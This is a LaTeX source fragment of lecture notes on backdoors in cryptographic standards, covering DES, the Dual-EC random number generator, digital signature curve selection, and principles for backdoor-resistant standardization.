\sidenote{
	USA used navajo as a code during WWII
	\begin{itemize}
		\item couldn't get an accurate phonetic rendering of the code
		\item provided authentication because people can't replicate the tonal language easily\\
	\end{itemize}
}

\textbf{Obvious weaknesses vs. back doors}\\
OBVIOUS WEAKNESS
\begin{itemize}
	\item everyone knows it and can see it
	\item eg. reducing the key size to make brute force attacks easier\\
\end{itemize}

BACK DOOR
\begin{itemize}
	\item presence is not obvious
	\item keyed backdoors vs. unkeyed backdoors

	KEYED BACKDOORS: need a secret master key to access back door

	UNKEYED BACKDOORS: not obvious, but just hoping that someone doesn't notice; like a hidden door in real like
\end{itemize}

\subsektion{Data Encryption Standard (DES)}
(1) introducing a stronger encryption standard would make US communications more secure
(2) but would also allow enemies to find/use this stronger encryption

\textbf{Three organizations working on DES}
IBM, NIST, NSA
DES is a Fiestel-like procedure
\begin{itemize}
	\item had S-boxes with constants (discovered differential crytpanalysis, S-boxes are resistant, but didn't want people to know about differential cryptanalysis)
	\item key length = 56 (NSA wanted to use 48, IBM wanted to use 64, they compromised at 56)
	\item a number of iterations
\end{itemize}
People were concerned about a builtin backdoor. In reality, NSA tried to weaken the algorithm (smaller key size) but installed no backdoor.

\subsektion{DUAL-EC}
\begin{definition}
	Relies on elliptic curves (EC)\\
	Points are solutions to equations of the form 
	$$y^2 \mod p = (x^3 + ax + b) \mod p$$
	You ``add" two EC points to get another EC point. Multiplying point by an int is the same as adding it to itself repeatedly.
\end{definition}

\textbf{How it works}
\begin{itemize}
	\item Pick random, non-secret EC points P, Q
	\item start with secret integer $s_0$
	\item to update and generate new output

		\hspace*{1cm} $s_i = x(s_{i-1} P)$ \hspace{1cm} where x(.) extracts x coord 

		\hspace*{1cm} output $T(x(s_i Q))$ \hspace{1cm} where T(.) truncates, discarding 16 high order bits
\end{itemize}

\textbf{Problem 1}\\
Adversary can create keyed backdoor if they can choose P and Q (see slides)\\
So then naturally the NSA chose P and Q.

\sidenote {
	\textbf{How to generate P and Q?}
	\begin{itemize}
		\item choose random seed
		\item use a one-way algorithm
		\item get P and Q
	\end{itemize}

	But what if adversary chooses the seed?\\
	\hspace*{1cm} It should be okay as long as one-way algorithm is good, and the adversary can't understand the relationship between P and Q
}


\textbf{Problem 2}
Output bits are easily distinguished from random.
NSA argued against fixing this (a vulnerability)

(It's overwhelmingly likely that NSA created a keyed backdoor into this standard by choosing P and Q)

\textbf{What happened}
SSL/TLS are exploitable in practice.
NIST's errors? Not insisting on fixing vulnerabilities, resulting in a loss of trust in NIST.

The end-user was more vulnerable to NSA due to keyed backdoor and more vulnerable to others due to the bias (unkeyed backdoor)\\
\textit{Net effect:} semi-keyed backdoor

\subsektion{Digital Signature standard (DSS)}
There are a lot of known insecure curves, and some curves that are probably secure, but no one can prove it. Let's also say that some adversary can break a fraction $f$ of the believed-good curves.\\

How do we choose a curve when the standard writer might be an adversary?
\begin{itemize}
	\item standard writer chooses a curve (never secure)
	\item choose randomly (secure with Pr = $1-f$)
	\item one-way algorithm with adversary choice; Pr = $(1-f)^k$
\end{itemize}

\subsektion{Backdoor-proof standardization}
\begin{itemize}
	\item Transparency

		discussions on the record, rationale for decisions published
	\item Discretion is a problem! It gives adversary latitude.

		eg. choice of technical approach, choice of mathematical structure, choice of constants
	\item Use competitions, because negotiations in a standards committee is risky.

		participants submit completely proposals. One is chosen by a group and the chosen proposal is adopted as-is or with absolutely clear improvements (this is how AES was gotten)
\end{itemize}

\textit{Shared trust standards benefit everyone :)}
}{
\input{Lecture16}}{

}\end{document}
